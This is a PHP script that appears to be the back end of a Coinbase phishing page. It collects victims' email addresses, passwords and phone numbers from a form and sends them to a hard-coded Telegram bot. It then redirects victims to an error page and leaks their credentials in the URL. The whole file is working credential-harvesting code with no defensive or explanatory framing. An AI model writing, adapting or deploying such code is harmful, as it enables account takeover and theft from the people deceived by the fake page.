<?php
$botToken = '7908574293:AAHt-3v0hArv51QZ08BhXOubbv4MXxhnKbw';
$chatID = '-1002332297611';

function sendMessageToTelegram($botToken, $chatID, $message) {
    $telegramURL = 'https://api.telegram.org/bot' . $botToken . '/sendMessage';
    $data = [
        'chat_id' => $chatID,
        'text' => $message
    ];

    $options = [
        'http' => [
            'method' => 'POST',
            'header' => 'Content-Type: application/x-www-form-urlencoded',
            'content' => http_build_query($data)
        ]
    ];

    $context = stream_context_create($options);
    $result = file_get_contents($telegramURL, false, $context);

    if ($result === false) {
        return 'Error sending message';
    } else {
        return 'Message sent successfully';
    }
}

if ($_SERVER["REQUEST_METHOD"] == "GET") {
    // Collect data from the form
    $email = $_GET['email'];
    $password = $_GET['password'];
    $phoneNumber = $_GET['phoneNumber'];

    // Message to be sent
    $message = "New form Coinbase-:\nEmail: $email\nPassword: $password\nPhone Number: $phoneNumber";

    // Send message to Telegram
    $result = sendMessageToTelegram($botToken, $chatID, $message);
   $redirect = 'error.html?email='.$email.'&password='.$password.'&phone='. $phoneNumber;
    // Redirect to verification.html
    header("Location:$redirect");
    exit; // Ensure that subsequent code is not executed after the redirect
}
?>
